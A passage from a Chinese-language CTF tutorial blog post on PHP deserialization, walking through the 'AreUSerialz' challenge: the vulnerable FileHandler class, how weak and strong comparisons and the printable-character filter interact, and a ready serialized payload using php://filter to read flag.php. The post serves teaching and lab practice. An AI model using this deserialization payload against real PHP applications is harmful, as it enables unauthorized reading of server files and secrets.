class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>{<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>{<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">"1"</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">"/tmp/tmpfile"</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">"Hello World!"</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>{<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">"1"</span>) {<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">"2"</span>) {<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        } <span class="hljs-keyword">else</span> {<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">"Bad Hacker!"</span>);<br>        }<br>    }<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>{<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) {<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) {<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">"Too long!"</span>);<br>                <span class="hljs-keyword">die</span>();<br>            }<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">"Successful!"</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">"Failed!"</span>);<br>        } <span class="hljs-keyword">else</span> {<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">"Failed!"</span>);<br>        }<br>    }<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>{<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">""</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) {<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        }<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    }<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"[Result]: &lt;br&gt;"</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    }<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>{<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">"2"</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">"1"</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">""</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    }<br>}<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>{<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>}<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>{<span class="hljs-string">'str'</span>})) {<br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'str'</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) {<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    }<br>}<br></code></pre></td></tr></table></figure>
<p>先从正向看，首先先用<code>GET</code>获取了<code>str</code>，并将其转换成字符串，再对其进行<code>is_valid()</code>检查，通过后对其进行反序列化</p>
<ul>
<li><code>is_valid()</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>{<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>}<br></code></pre></td></tr></table></figure>
<p>对传入的字符串每一位进行检查，要求每一位的<code>ASCII</code>值必须介于32与125之间，即所有可见字符（除了<code>~</code>）</p>
<ul>
<li><code>__destruct()</code></li>
</ul>
<p>根据上面我们做的<code>Triggering Sequence</code>测试，可以知道在这里会先触发<code>__destruct()</code>方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>{<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">"2"</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">"1"</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">""</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>}<br></code></pre></td></tr></table></figure>
<p>如果<code>op === “2”</code>，那么<code>op会被赋值为</code>“1”<code>，然后</code>content<code>会赋值为空，并执行</code>process()`方法，这里的判断用的是<strong>强类型比较</strong>。</p>
<ul>
<li><code>process()</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>{<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">"1"</span>) {<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">"2"</span>) {<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        } <span class="hljs-keyword">else</span> {<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">"Bad Hacker!"</span>);<br>        }<br>}<br></code></pre></td></tr></table></figure>
<p>如果<code>op == “1”</code>，执行<code>write()</code>函数；如果<code>op ==“2”</code>，执行<code>read</code>函数，同时将结果赋值给<code>$res</code>，然后输出；否则将输出<code>"Bad Hacker！"</code>。这里的判断用的是<strong>弱类型比较</strong></p>
<ul>
<li><code>read()</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>{<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">""</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) {<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        }<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>}<br></code></pre></td></tr></table></figure>
<p>在<code>read()</code>方法中，使用<code>filename</code>调用<code>file_get_contents()</code>方法将文件内容赋值给<code>$res</code>返回。对于<code>filename</code>，我们可以用<code>filter伪协议</code>读取文件，再使用<code>output()</code>方法输出。</p>
<p>但是这里的<code>filename</code>是<code>protected</code>类型的，在对其进行序列化时会出现以下情况</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>{<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br>}<br><br><span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$f</span>).<span class="hljs-string">"\n"</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$f</span>));<br><br><span class="hljs-comment">// output</span><br>O:<span class="hljs-number">11</span>:<span class="hljs-string">"FileHandler"</span>:<span class="hljs-number">3</span>:{s:<span class="hljs-number">5</span>:<span class="hljs-string">"*op"</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">"*filename"</span>;s:<span class="hljs-number">57</span>:<span class="hljs-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">"*content"</span>;N;}<br>O%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>FileHandler%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>op%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>filename%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A57%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>php%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Ffilter%<span class="hljs-number">2</span>Fread%<span class="hljs-number">3</span>Dconvert.base64-encode%<span class="hljs-number">2</span>Fresource%<span class="hljs-number">3</span>Dflag.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>content%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%   <br></code></pre></td></tr></table></figure>
<p>在<code>protected</code>类型的属性前面，会出现<code>\x00</code>，而其显然不是可见字符，无法通过<code>is_valid()</code>方法</p>
<p>我们查询一下环境的<code>PHP</code>版本：</p>
<p><img src="..\img\php-unserialize\u4.png" alt="u4"></p>
<p>在高版本的<code>PHP</code>中，其对属性类型不敏感，所以我们可以直接将其改成<code>public</code>类型</p>
<p><code>payload: ?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}</code></p>
<p>这样就会输出<code>flag.php</code>的<code>Base64</code>编码之后的内容，解码之后就能得到<code>flag</code>了</p>
<h2 id="HomeWork"><a href="#HomeWork" class="headerlink" title="HomeWork"></a>HomeWork</h2><ul>
<li><p>复现<code>！动启，案档蓝蔚</code>和<code>AreUSerialz</code></p>
</li>
<li><p>解出<code>ez_yii</code>（主站上有）</p>
</li>
</ul>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/11/15/FreeBSD-ctags/">← Next FreeBSD-ctags</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/11/12/burpsuite/">burpsuite Prev →</a></div></div></div><details id="reward"><summary>reward</summary><div><span>Alipay</span><br><img src="/img/Alipay.png"></div><div><span>Wechat</span><br><img src="/img/WeChat.png"></div></details><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Zedsich</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Unserialize-Intro"><span class="toc-number">1.</span> <span class="toc-text">Unserialize Intro</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Installation"><span class="toc-number">1.1.</span> <span class="toc-text">Installation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows"><span class="toc-number">1.1.1.</span> <span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux"><span class="toc-number">1.1.2.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Use-Apache"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">Use Apache</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Use-Nginx"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">Use Nginx</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Class-amp-Object"><span class="toc-number">1.2.</span> <span class="toc-text">Class &amp; Object</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-Serialize-amp-Unserialize"><span class="toc-number">1.3.</span> <span class="toc-text">What is Serialize &amp; Unserialize?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Magic-Functions"><span class="toc-number">1.4.</span> <span class="toc-text">Magic Functions</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep-amp-wakeup"><span class="toc-number">1.4.1.</span> <span class="toc-text">__sleep() &amp; __wakeup()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#toString-NaN"><span class="toc-number">1.4.2.</span> <span class="toc-text">__toString()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-amp-set"><span class="toc-number">1.4.3.</span> <span class="toc-text">__get() &amp; __set()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Triggering-Sequence"><span class="toc-number">1.4.4.</span> <span class="toc-text">Triggering Sequence</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ez-Bypass"><span class="toc-number">1.5.</span> <span class="toc-text">Ez Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wakeup-Bypass"><span class="toc-number">1.5.1.</span> <span class="toc-text">__wakeup() Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#destruct-Garbage-Collection"><span class="toc-number">1.5.2.</span> <span class="toc-text">__destruct() Garbage Collection</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#What-is-Garbage-Collection"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">What is Garbage Collection?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">Bypass</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POP"><span class="toc-number">1.6.</span> <span class="toc-text">POP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%81%E5%8A%A8%E5%90%AF%EF%BC%8C%E6%A1%88%E6%A1%A3%E8%93%9D%E8%94%9A"><span class="toc-number">1.6.1.</span> <span class="toc-text">！动启，案档蓝蔚</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AreUSerialz"><span class="toc-number">1.6.2.</span> <span class="toc-text">AreUSerialz</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HomeWork"><span class="toc-number">1.7.</span> <span class="toc-text">HomeWork</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
 el: '#valine'
 , appId: '12mmdjDQr3Zp2ZAH5T8u420K-gzGzoHsz'
 , appKey: 'B6NVCNzhi3ZWtXN73NUXFT3D' , placeholder: 'This comment is sent by Penguin Logistics.'
 , path: window.location.pathname
});code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>